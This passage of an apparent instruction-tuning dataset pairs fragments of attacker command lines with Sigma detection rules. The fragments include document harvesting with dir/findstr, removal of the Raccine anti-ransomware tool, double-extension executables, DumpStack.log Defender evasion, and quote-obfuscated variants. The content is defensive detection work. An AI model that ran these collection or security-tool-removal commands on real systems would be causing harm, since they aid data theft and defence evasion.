CommandLine|contains|all:\n            - 'dir '\n            - ' /b '\n            - ' /s '\n    selection_other_findstr:\n        OriginalFileName: 'FINDSTR.EXE'\n        CommandLine|contains:\n            - ' /e '\n            - ' /si '\n    condition: selection_ext and 1 of selection_other_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".doc .docx .xls .xlsx .ppt .pptx .rtf .pdf .txt dir /b /s FINDSTR /e /si", "output": "title: Automated Collection Command Prompt\nid: f576a613-2392-4067-9d1a-9345fb58d8d1\nstatus: test\ndescription: Once established within a system or network, an adversary may use automated techniques for collecting internal data.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nauthor: frack113\ndate: 2021-07-28\nmodified: 2022-11-11\ntags:\n    - attack.collection\n    - attack.t1119\n    - attack.credential-access\n    - attack.t1552.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ext:\n        CommandLine|contains:\n            - '.doc'\n            - '.docx'\n            - '.xls'\n            - '.xlsx'\n            - '.ppt'\n            - '.pptx'\n            - '.rtf'\n            - '.pdf'\n            - '.txt'\n    selection_other_dir:\n        CommandLine|contains|all:\n            - 'dir '\n            - ' /b '\n            - ' /s '\n    selection_other_findstr:\n        OriginalFileName: 'FINDSTR.EXE'\n        CommandLine|contains:\n            - ' /e '\n            - ' /si '\n    condition: selection_ext and 1 of selection_other_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".doc .docx .xls .xlsx .ppt .pptx .rtf .pdf .txt dir /b /s FINDSTR.EXE /e /si", "output": "title: Automated Collection Command Prompt\nid: f576a613-2392-4067-9d1a-9345fb58d8d1\nstatus: test\ndescription: Once established within a system or network, an adversary may use automated techniques for collecting internal data.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nauthor: frack113\ndate: 2021-07-28\nmodified: 2022-11-11\ntags:\n    - attack.collection\n    - attack.t1119\n    - attack.credential-access\n    - attack.t1552.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ext:\n        CommandLine|contains:\n            - '.doc'\n            - '.docx'\n            - '.xls'\n            - '.xlsx'\n            - '.ppt'\n            - '.pptx'\n            - '.rtf'\n            - '.pdf'\n            - '.txt'\n    selection_other_dir:\n        CommandLine|contains|all:\n            - 'dir '\n            - ' /b '\n            - ' /s '\n    selection_other_findstr:\n        OriginalFileName: 'FINDSTR.EXE'\n        CommandLine|contains:\n            - ' /e '\n            - ' /si '\n    condition: selection_ext and 1 of selection_other_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\firefox.exe \\msedge.exe \\opera.exe \\maxthon.exe \\seamonkey.exe \\vivaldi.exe http", "output": "title: Potential Suspicious Browser Launch From Document Reader Process\nid: 1193d960-2369-499f-a158-7b50a31df682\nstatus: test\ndescription: |\n    Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.\nreferences:\n    - https://app.any.run/tasks/69c5abaa-92ad-45ba-8c53-c11e23e05d04/ # PDF Document\n    - https://app.any.run/tasks/64043a79-165f-4052-bcba-e6e49f847ec1/ # Office Document\nauthor: Joseph Kamau\ndate: 2024-05-27\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|contains:\n            - 'Acrobat Reader'\n            - 'Microsoft Office'\n            - 'PDF Reader'\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\firefox.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\maxthon.exe'\n            - '\\seamonkey.exe'\n            - '\\vivaldi.exe'\n            - ''\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Unlikely in most cases, further investigation should be done in the commandline of the browser process to determine the context of the URL accessed.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\firefox.exe \\msedge.exe \\opera.exe \\\"\\maxth\\\"on.exe \\seamonkey.exe \\vivaldi.exe http", "output": "title: Potential Suspicious Browser Launch From Document Reader Process\nid: 1193d960-2369-499f-a158-7b50a31df682\nstatus: test\ndescription: |\n    Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.\nreferences:\n    - https://app.any.run/tasks/69c5abaa-92ad-45ba-8c53-c11e23e05d04/ # PDF Document\n    - https://app.any.run/tasks/64043a79-165f-4052-bcba-e6e49f847ec1/ # Office Document\nauthor: Joseph Kamau\ndate: 2024-05-27\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|contains:\n            - 'Acrobat Reader'\n            - 'Microsoft Office'\n            - 'PDF Reader'\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\firefox.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\maxthon.exe'\n            - '\\seamonkey.exe'\n            - '\\vivaldi.exe'\n            - ''\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Unlikely in most cases, further investigation should be done in the commandline of the browser process to determine the context of the URL accessed.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave \\chrome \\firefox \\msedge \\opera \\maxthon \\seamonkey \\vivaldi http", "output": "title: Potential Suspicious Browser Launch From Document Reader Process\nid: 1193d960-2369-499f-a158-7b50a31df682\nstatus: test\ndescription: |\n    Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.\nreferences:\n    - https://app.any.run/tasks/69c5abaa-92ad-45ba-8c53-c11e23e05d04/ # PDF Document\n    - https://app.any.run/tasks/64043a79-165f-4052-bcba-e6e49f847ec1/ # Office Document\nauthor: Joseph Kamau\ndate: 2024-05-27\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|contains:\n            - 'Acrobat Reader'\n            - 'Microsoft Office'\n            - 'PDF Reader'\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\firefox.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\maxthon.exe'\n            - '\\seamonkey.exe'\n            - '\\vivaldi.exe'\n            - ''\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Unlikely in most cases, further investigation should be done in the commandline of the browser process to determine the context of the URL accessed.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\firefox.exe \\msedge.exe \\opera.exe \\maxthon.exe \\seamonkey.exe \\vivaldi.exe http", "output": "title: Potential Suspicious Browser Launch From Document Reader Process\nid: 1193d960-2369-499f-a158-7b50a31df682\nstatus: test\ndescription: |\n    Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.\nreferences:\n    - https://app.any.run/tasks/69c5abaa-92ad-45ba-8c53-c11e23e05d04/ # PDF Document\n    - https://app.any.run/tasks/64043a79-165f-4052-bcba-e6e49f847ec1/ # Office Document\nauthor: Joseph Kamau\ndate: 2024-05-27\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|contains:\n            - 'Acrobat Reader'\n            - 'Microsoft Office'\n            - 'PDF Reader'\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\firefox.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\maxthon.exe'\n            - '\\seamonkey.exe'\n            - '\\vivaldi.exe'\n            - ''\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Unlikely in most cases, further investigation should be done in the commandline of the browser process to determine the context of the URL accessed.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill RaccineSettings.exe reg.exe delete Raccine Tray schtasks /DELETE Raccine Rules Updater", "output": "title: Raccine Uninstall\nid: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc\nstatus: test\ndescription: Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.\nreferences:\n    - https://github.com/Neo23x0/Raccine\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-01-21\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - 'taskkill '\n            - 'RaccineSettings.exe'\n    selection2:\n        CommandLine|contains|all:\n            - 'reg.exe'\n            - 'delete'\n            - 'Raccine Tray'\n    selection3:\n        CommandLine|contains|all:\n            - 'schtasks'\n            - '/DELETE'\n            - 'Raccine Rules Updater'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate deinstallation by administrative staff\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill RaccineSettings.exe reg.exe delete Raccine Tray scht\\\"asks\\\" /DELETE Raccine Rules Updater", "output": "title: Raccine Uninstall\nid: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc\nstatus: test\ndescription: Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.\nreferences:\n    - https://github.com/Neo23x0/Raccine\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-01-21\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - 'taskkill '\n            - 'RaccineSettings.exe'\n    selection2:\n        CommandLine|contains|all:\n            - 'reg.exe'\n            - 'delete'\n            - 'Raccine Tray'\n    selection3:\n        CommandLine|contains|all:\n            - 'schtasks'\n            - '/DELETE'\n            - 'Raccine Rules Updater'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate deinstallation by administrative staff\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill RaccineSettings.exe reg.exe delete Raccine Tray schtasks /DELETE Raccine Rules Updater", "output": "title: Raccine Uninstall\nid: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc\nstatus: test\ndescription: Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.\nreferences:\n    - https://github.com/Neo23x0/Raccine\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-01-21\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - 'taskkill '\n            - 'RaccineSettings.exe'\n    selection2:\n        CommandLine|contains|all:\n            - 'reg.exe'\n            - 'delete'\n            - 'Raccine Tray'\n    selection3:\n        CommandLine|contains|all:\n            - 'schtasks'\n            - '/DELETE'\n            - 'Raccine Rules Updater'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate deinstallation by administrative staff\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill RaccineSettings reg delete Raccine Tray schtasks /DELETE Raccine Rules Updater", "output": "title: Raccine Uninstall\nid: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc\nstatus: test\ndescription: Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.\nreferences:\n    - https://github.com/Neo23x0/Raccine\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-01-21\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - 'taskkill '\n            - 'RaccineSettings.exe'\n    selection2:\n        CommandLine|contains|all:\n            - 'reg.exe'\n            - 'delete'\n            - 'Raccine Tray'\n    selection3:\n        CommandLine|contains|all:\n            - 'schtasks'\n            - '/DELETE'\n            - 'Raccine Rules Updater'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate deinstallation by administrative staff\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill RaccineSettings.exe reg.exe delete Raccine Tray schtasks /DELETE Raccine Rules Updater", "output": "title: Raccine Uninstall\nid: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc\nstatus: test\ndescription: Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.\nreferences:\n    - https://github.com/Neo23x0/Raccine\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-01-21\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - 'taskkill '\n            - 'RaccineSettings.exe'\n    selection2:\n        CommandLine|contains|all:\n            - 'reg.exe'\n            - 'delete'\n            - 'Raccine Tray'\n    selection3:\n        CommandLine|contains|all:\n            - 'schtasks'\n            - '/DELETE'\n            - 'Raccine Rules Updater'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate deinstallation by administrative staff\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".exe ______.exe .doc.exe .doc.js .docx.exe .docx.js .gif.exe .jpeg.exe .jpg.exe .mkv.exe .mov.exe .mp3.exe .mp4.exe .pdf.exe .pdf.js .png.exe .ppt.exe .ppt.js .pptx.exe .pptx.js .rtf.exe .rtf.js .svg.exe .txt.exe .txt.js .xls.exe .xls.js .xlsx.exe .xlsx.js ⠀⠀⠀⠀⠀⠀.exe .exe ______.exe .doc.exe .doc.js .docx.exe .docx.js .gif.exe .jpeg.exe .jpg.exe .mkv.exe .mov.exe .mp3.exe .mp4.exe .pdf.exe .pdf.js .png.exe .ppt.exe .ppt.js .pptx.exe .pptx.js .rtf.exe .rtf.js .svg.exe .txt.exe .txt.js .xls.exe .xls.js .xlsx.exe .xlsx.js ⠀⠀⠀⠀⠀⠀.exe", "output": "title: Suspicious Double Extension File Execution\nid: 1cdd9a09-06c9-4769-99ff-626e2b3991b8\nrelated:\n    - id: 5e6a80c8-2d45-4633-9ef4-fa2671a39c5c # ParentImage/ParentCommandLine\n      type: similar\nstatus: stable\ndescription: Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns\nreferences:\n    - https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html\n    - https://twitter.com/blackorbird/status/1140519090961825792\n    - https://cloud.google.com/blog/topics/threat-intelligence/cybercriminals-weaponize-fake-ai-websites\nauthor: Florian Roth (Nextron Systems), @blu3_team (idea), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-06-26\nmodified: 2025-05-30\ntags:\n    - attack.initial-access\n    - attack.t1566.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '      .exe'\n            - '______.exe'\n            - '.doc.exe'\n            - '.doc.js'\n            - '.docx.exe'\n            - '.docx.js'\n            - '.gif.exe'\n            - '.jpeg.exe'\n            - '.jpg.exe'\n            - '.mkv.exe'\n            - '.mov.exe'\n            - '.mp3.exe'\n            - '.mp4.exe'\n            - '.pdf.exe'\n            - '.pdf.js'\n            - '.png.exe'\n            - '.ppt.exe'\n            - '.ppt.js'\n            - '.pptx.exe'\n            - '.pptx.js'\n            - '.rtf.exe'\n            - '.rtf.js'\n            - '.svg.exe'\n            - '.txt.exe'\n            - '.txt.js'\n            - '.xls.exe'\n            - '.xls.js'\n            - '.xlsx.exe'\n            - '.xlsx.js'\n            - '⠀⠀⠀⠀⠀⠀.exe' # Unicode Space Character: Braille Pattern Blank (Unicode: U+2800)\n        CommandLine|contains:\n            - '      .exe'\n            - '______.exe'\n            - '.doc.exe'\n            - '.doc.js'\n            - '.docx.exe'\n            - '.docx.js'\n            - '.gif.exe'\n            - '.jpeg.exe'\n            - '.jpg.exe'\n            - '.mkv.exe'\n            - '.mov.exe'\n            - '.mp3.exe'\n            - '.mp4.exe'\n            - '.pdf.exe'\n            - '.pdf.js'\n            - '.png.exe'\n            - '.ppt.exe'\n            - '.ppt.js'\n            - '.pptx.exe'\n            - '.pptx.js'\n            - '.rtf.exe'\n            - '.rtf.js'\n            - '.svg.exe'\n            - '.txt.exe'\n            - '.txt.js'\n            - '.xls.exe'\n            - '.xls.js'\n            - '.xlsx.exe'\n            - '.xlsx.js'\n            - '⠀⠀⠀⠀⠀⠀.exe' # Unicode Space Character: Braille Pattern Blank (Unicode: U+2800)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".exe ______.exe .doc.exe .doc.js .docx.exe .docx.js .gif.exe .jpeg.exe .jpg.exe .mkv.exe .mov.exe .mp3.exe .mp4.exe .pdf.exe .pdf.js .png.exe .ppt.exe .ppt.js .pptx.exe .pptx.js .rtf.exe .rtf.js .svg.exe .txt.exe .txt.js .xls.exe .xls.js .xlsx.exe .xlsx.js ⠀⠀⠀⠀⠀⠀.exe .exe ______.exe .doc.exe .doc.js .docx.exe .docx.js .gif.exe .jpeg.exe .jpg.exe .mkv.exe .mov.exe .mp3.exe .mp4.exe .pdf.exe .pdf.js .png.exe .ppt.exe .ppt.js .pptx.exe .pptx.js .rtf.exe .rtf.js .svg.exe .txt.exe .txt.js .xls.exe .xl\"s.js\" .xlsx.exe .xlsx.js ⠀⠀⠀⠀⠀⠀.exe", "output": "title: Suspicious Double Extension File Execution\nid: 1cdd9a09-06c9-4769-99ff-626e2b3991b8\nrelated:\n    - id: 5e6a80c8-2d45-4633-9ef4-fa2671a39c5c # ParentImage/ParentCommandLine\n      type: similar\nstatus: stable\ndescription: Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns\nreferences:\n    - https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html\n    - https://twitter.com/blackorbird/status/1140519090961825792\n    - https://cloud.google.com/blog/topics/threat-intelligence/cybercriminals-weaponize-fake-ai-websites\nauthor: Florian Roth (Nextron Systems), @blu3_team (idea), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-06-26\nmodified: 2025-05-30\ntags:\n    - attack.initial-access\n    - attack.t1566.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '      .exe'\n            - '______.exe'\n            - '.doc.exe'\n            - '.doc.js'\n            - '.docx.exe'\n            - '.docx.js'\n            - '.gif.exe'\n            - '.jpeg.exe'\n            - '.jpg.exe'\n            - '.mkv.exe'\n            - '.mov.exe'\n            - '.mp3.exe'\n            - '.mp4.exe'\n            - '.pdf.exe'\n            - '.pdf.js'\n            - '.png.exe'\n            - '.ppt.exe'\n            - '.ppt.js'\n            - '.pptx.exe'\n            - '.pptx.js'\n            - '.rtf.exe'\n            - '.rtf.js'\n            - '.svg.exe'\n            - '.txt.exe'\n            - '.txt.js'\n            - '.xls.exe'\n            - '.xls.js'\n            - '.xlsx.exe'\n            - '.xlsx.js'\n            - '⠀⠀⠀⠀⠀⠀.exe' # Unicode Space Character: Braille Pattern Blank (Unicode: U+2800)\n        CommandLine|contains:\n            - '      .exe'\n            - '______.exe'\n            - '.doc.exe'\n            - '.doc.js'\n            - '.docx.exe'\n            - '.docx.js'\n            - '.gif.exe'\n            - '.jpeg.exe'\n            - '.jpg.exe'\n            - '.mkv.exe'\n            - '.mov.exe'\n            - '.mp3.exe'\n            - '.mp4.exe'\n            - '.pdf.exe'\n            - '.pdf.js'\n            - '.png.exe'\n            - '.ppt.exe'\n            - '.ppt.js'\n            - '.pptx.exe'\n            - '.pptx.js'\n            - '.rtf.exe'\n            - '.rtf.js'\n            - '.svg.exe'\n            - '.txt.exe'\n            - '.txt.js'\n            - '.xls.exe'\n            - '.xls.js'\n            - '.xlsx.exe'\n            - '.xlsx.js'\n            - '⠀⠀⠀⠀⠀⠀.exe' # Unicode Space Character: Braille Pattern Blank (Unicode: U+2800)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "______ .doc .doc .docx .docx .gif .jpeg .jpg .mkv .mov .mp3 .mp4 .pdf .pdf .png .ppt .ppt .pptx .pptx .rtf .rtf .svg .txt .txt .xls .xls .xlsx .xlsx ⠀⠀⠀⠀⠀⠀ ______ .doc .doc .docx .docx .gif .jpeg .jpg .mkv .mov .mp3 .mp4 .pdf .pdf .png .ppt .ppt .pptx .pptx .rtf .rtf .svg .txt .txt .xls .xls .xlsx .xlsx ⠀⠀⠀⠀⠀⠀", "output": "title: Suspicious Double Extension File Execution\nid: 1cdd9a09-06c9-4769-99ff-626e2b3991b8\nrelated:\n    - id: 5e6a80c8-2d45-4633-9ef4-fa2671a39c5c # ParentImage/ParentCommandLine\n      type: similar\nstatus: stable\ndescription: Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns\nreferences:\n    - https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html\n    - https://twitter.com/blackorbird/status/1140519090961825792\n    - https://cloud.google.com/blog/topics/threat-intelligence/cybercriminals-weaponize-fake-ai-websites\nauthor: Florian Roth (Nextron Systems), @blu3_team (idea), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-06-26\nmodified: 2025-05-30\ntags:\n    - attack.initial-access\n    - attack.t1566.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '      .exe'\n            - '______.exe'\n            - '.doc.exe'\n            - '.doc.js'\n            - '.docx.exe'\n            - '.docx.js'\n            - '.gif.exe'\n            - '.jpeg.exe'\n            - '.jpg.exe'\n            - '.mkv.exe'\n            - '.mov.exe'\n            - '.mp3.exe'\n            - '.mp4.exe'\n            - '.pdf.exe'\n            - '.pdf.js'\n            - '.png.exe'\n            - '.ppt.exe'\n            - '.ppt.js'\n            - '.pptx.exe'\n            - '.pptx.js'\n            - '.rtf.exe'\n            - '.rtf.js'\n            - '.svg.exe'\n            - '.txt.exe'\n            - '.txt.js'\n            - '.xls.exe'\n            - '.xls.js'\n            - '.xlsx.exe'\n            - '.xlsx.js'\n            - '⠀⠀⠀⠀⠀⠀.exe' # Unicode Space Character: Braille Pattern Blank (Unicode: U+2800)\n        CommandLine|contains:\n            - '      .exe'\n            - '______.exe'\n            - '.doc.exe'\n            - '.doc.js'\n            - '.docx.exe'\n            - '.docx.js'\n            - '.gif.exe'\n            - '.jpeg.exe'\n            - '.jpg.exe'\n            - '.mkv.exe'\n            - '.mov.exe'\n            - '.mp3.exe'\n            - '.mp4.exe'\n            - '.pdf.exe'\n            - '.pdf.js'\n            - '.png.exe'\n            - '.ppt.exe'\n            - '.ppt.js'\n            - '.pptx.exe'\n            - '.pptx.js'\n            - '.rtf.exe'\n            - '.rtf.js'\n            - '.svg.exe'\n            - '.txt.exe'\n            - '.txt.js'\n            - '.xls.exe'\n            - '.xls.js'\n            - '.xlsx.exe'\n            - '.xlsx.js'\n            - '⠀⠀⠀⠀⠀⠀.exe' # Unicode Space Character: Braille Pattern Blank (Unicode: U+2800)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".exe ______.exe .doc.exe .doc.js .docx.exe .docx.js .gif.exe .jpeg.exe .jpg.exe .mkv.exe .mov.exe .mp3.exe .mp4.exe .pdf.exe .pdf.js .png.exe .ppt.exe .ppt.js .pptx.exe .pptx.js .rtf.exe .rtf.js .svg.exe .txt.exe .txt.js .xls.exe .xls.js .xlsx.exe .xlsx.js ⠀⠀⠀⠀⠀⠀.exe .exe ______.exe .doc.exe .doc.js .docx.exe .docx.js .gif.exe .jpeg.exe .jpg.exe .mkv.exe .mov.exe .mp3.exe .mp4.exe .pdf.exe .pdf.js .png.exe .ppt.exe .ppt.js .pptx.exe .pptx.js .rtf.exe .rtf.js .svg.exe .txt.exe .txt.js .xls.exe .xls.js .xlsx.exe .xlsx.js ⠀⠀⠀⠀⠀⠀.exe", "output": "title: Suspicious Double Extension File Execution\nid: 1cdd9a09-06c9-4769-99ff-626e2b3991b8\nrelated:\n    - id: 5e6a80c8-2d45-4633-9ef4-fa2671a39c5c # ParentImage/ParentCommandLine\n      type: similar\nstatus: stable\ndescription: Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns\nreferences:\n    - https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html\n    - https://twitter.com/blackorbird/status/1140519090961825792\n    - https://cloud.google.com/blog/topics/threat-intelligence/cybercriminals-weaponize-fake-ai-websites\nauthor: Florian Roth (Nextron Systems), @blu3_team (idea), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-06-26\nmodified: 2025-05-30\ntags:\n    - attack.initial-access\n    - attack.t1566.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '      .exe'\n            - '______.exe'\n            - '.doc.exe'\n            - '.doc.js'\n            - '.docx.exe'\n            - '.docx.js'\n            - '.gif.exe'\n            - '.jpeg.exe'\n            - '.jpg.exe'\n            - '.mkv.exe'\n            - '.mov.exe'\n            - '.mp3.exe'\n            - '.mp4.exe'\n            - '.pdf.exe'\n            - '.pdf.js'\n            - '.png.exe'\n            - '.ppt.exe'\n            - '.ppt.js'\n            - '.pptx.exe'\n            - '.pptx.js'\n            - '.rtf.exe'\n            - '.rtf.js'\n            - '.svg.exe'\n            - '.txt.exe'\n            - '.txt.js'\n            - '.xls.exe'\n            - '.xls.js'\n            - '.xlsx.exe'\n            - '.xlsx.js'\n            - '⠀⠀⠀⠀⠀⠀.exe' # Unicode Space Character: Braille Pattern Blank (Unicode: U+2800)\n        CommandLine|contains:\n            - '      .exe'\n            - '______.exe'\n            - '.doc.exe'\n            - '.doc.js'\n            - '.docx.exe'\n            - '.docx.js'\n            - '.gif.exe'\n            - '.jpeg.exe'\n            - '.jpg.exe'\n            - '.mkv.exe'\n            - '.mov.exe'\n            - '.mp3.exe'\n            - '.mp4.exe'\n            - '.pdf.exe'\n            - '.pdf.js'\n            - '.png.exe'\n            - '.ppt.exe'\n            - '.ppt.js'\n            - '.pptx.exe'\n            - '.pptx.js'\n            - '.rtf.exe'\n            - '.rtf.js'\n            - '.svg.exe'\n            - '.txt.exe'\n            - '.txt.js'\n            - '.xls.exe'\n            - '.xls.js'\n            - '.xlsx.exe'\n            - '.xlsx.js'\n            - '⠀⠀⠀⠀⠀⠀.exe' # Unicode Space Character: Braille Pattern Blank (Unicode: U+2800)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DumpStack.log -o DumpStack.log", "output": "title: DumpStack.log Defender Evasion\nid: 4f647cfa-b598-4e12-ad69-c68dd16caef8\nstatus: test\ndescription: Detects the use of the filename DumpStack.log to evade Microsoft Defender\nreferences:\n    - https://twitter.com/mrd0x/status/1479094189048713219\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-06\nmodified: 2022-06-17\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\DumpStack.log'\n    selection_download:\n        CommandLine|contains: ' -o DumpStack.log'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DumpStack.log -o \\\"D\\\"\\\"u\\\"\\\"m\\\"\\\"p\\\"\\\"S\\\"\\\"t\\\"\\\"a\\\"\\\"c\\\"\\\"k\\\"\\\".\\\"\\\"l\\\"\\\"o\\\"\\\"g\\\"", "output": "title: DumpStack.log Defender Evasion\nid: 4f647cfa-b598-4e12-ad69-c68dd16caef8\nstatus: test\ndescription: Detects the use of the filename DumpStack.log to evade Microsoft Defender\nreferences:\n    - https://twitter.com/mrd0x/status/1479094189048713219\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-06\nmodified: 2022-06-17\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\DumpStack.log'\n    selection_download:\n        CommandLine|contains: ' -o DumpStack.log'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: critical"}
